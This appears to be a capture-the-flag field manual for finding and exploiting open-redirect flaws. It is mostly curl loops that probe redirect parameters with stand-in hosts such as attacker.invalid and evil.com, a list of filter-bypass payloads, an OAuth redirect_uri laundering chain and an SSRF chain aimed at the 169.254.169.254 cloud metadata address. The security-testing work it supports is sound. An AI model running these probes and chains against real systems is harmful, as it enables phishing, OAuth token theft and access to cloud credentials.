# Field manual — the operating procedure for an open-redirect surface

## The intake — what you're given

A web target with a parameter that names a destination — a `next`, a
`return`, a `redirect_uri`, a `url`. The response is a redirect; the
param may land in the `Location:` header. The question: does the server
emit an attacker-controlled destination?

## The 5-minute pass

```bash
# 1. the param sweep — the vocabulary
python3 tools/web/redirect_probe.py --url "$BASE/login" --param next
# 2. the canary
curl -si "$BASE/login?next=https%3A%2F%2Fattacker.invalid" | grep -i location
# 3. the fingerprint — read the ONE Location
# 4. the matching arms — the filter shape names them
# 5. record — candidate / negative / falsifier
```

## The 30-minute pass — the surface enumeration

```bash
# the param vocabulary over the endpoints
for p in next url redir redirect return returnTo goto dest target continue \
         callback to out link ref back prev view RelayState; do
  echo "== $p =="
  curl -si "$BASE/login?$p=https%3A%2F%2Fattacker.invalid" | grep -i '^location'
done
# the surfaces — login/logout/oauth/tracker/fetcher/error/multi-step
for ep in /login /logout /oauth/authorize /out /goto /link /r /u \
          /redirect /return /back /error /img /fetch /proxy; do
  echo "== $ep =="
  curl -si "$BASE$ep?next=https%3A%2F%2Fattacker.invalid" | grep -i '^location'
done
```

## The bypass pass — the filter-shape-specific arms

```bash
# once the fingerprint names the filter — the matching arms
for arm in '//evil.com' '/\evil.com' '\\evil.com' '/%5cevil.com' \
  'https://target.com@evil.com' 'evil.com\@target.com' \
  'https://target.com.evil.com' 'https://evil.com/target.com' \
  'https:%2f%2fevil.com' 'https%3a%2f%2fevil.com' \
  'https%253a%252f%252fevil.com' 'javascript:alert(1)'; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$arm")
  echo "== $arm =="
  curl -si "$BASE/login?next=$enc" | grep -i '^location'
done
```

## The stored/two-step pass

```bash
# the set-then-fire — a param that persists
curl -s -c c.txt "$BASE/register?return_to=https://attacker.invalid"
curl -si -b c.txt "$BASE/login" | grep -i '^location'
```

## The Referer pass

```bash
curl -si -H "Referer: https://attacker.invalid" "$BASE/back" | grep -i '^location'
```

## The client-side pass

```bash
# the meta-refresh + the JS-nav
curl -s "$BASE/redirect?url=https://attacker.invalid" | grep -iE 'refresh|location|window\.location'
# the bundle-side DOM-sink
curl -s "$BASE/app.js" | grep -oE 'location\.(href|replace|assign)|window\.location|location\.hash'
```

## The chain pass

```bash
# the OAuth launder — the redirect_uri through the open redirect
curl -si "$OAUTH/authorize?client_id=X&redirect_uri=https%3A%2F%2Ftarget.com%2Fredirect%3Fnext%3Dhttps%253A%252F%252Fattacker.invalid" | grep -i location
# the SSRF-follow — a fetcher through the redirect
curl -s "$BASE/fetch?url=http://target.com/redirect%3Fnext%3Dhttp%3A%2F%2F169.254.169.254%2F"
```

## The record

```bash
python3 tools/hooks.py post-probe <challenge> --hypothesis-id <id> \
  --class web-open-redirect --verdict confirms --evidence-kind class \
  --evidence 'Location: https://attacker.invalid' \
  --response '<the verbatim 302>'
```

## The discipline

- ONE param, ONE carrier, ONE arm at a time — an attributable result
- the verbatim `Location:` is the evidence; the fingerprint names the arms
- a uniform `Location: <safe>` on every arm is the class falsifier
- a confirmed `Location: <canary>` routes to the chain (`chain-routes.md`)
- a standalone `Location: <canary>` IS the class-answer if the challenge
  is the phishing/domain-launder shape
